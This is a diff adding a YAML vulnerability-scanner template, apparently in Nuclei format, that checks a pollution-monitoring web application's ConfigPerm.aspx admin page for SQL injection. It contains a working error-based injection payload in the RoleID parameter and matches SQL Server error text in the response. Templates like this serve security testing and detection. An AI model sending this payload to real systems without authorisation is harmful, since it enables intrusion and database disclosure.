@@ -1,0 +1,21 @@
+id: Pollution-monitoring-ConfigPerm-sqli
+info:
+  name: Pollution-monitoring-ConfigPerm-sqli
+  author: lemonlove7
+  severity: high
+http:
+  - raw:
+      - |-
+        GET /Admin/System/Role/ConfigPerm.aspx?action=GetSelPerm&RoleID=1%27%20and%20@@version>0-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - Microsoft SQL Server
+          - nvarchar
+    matchers-condition: and
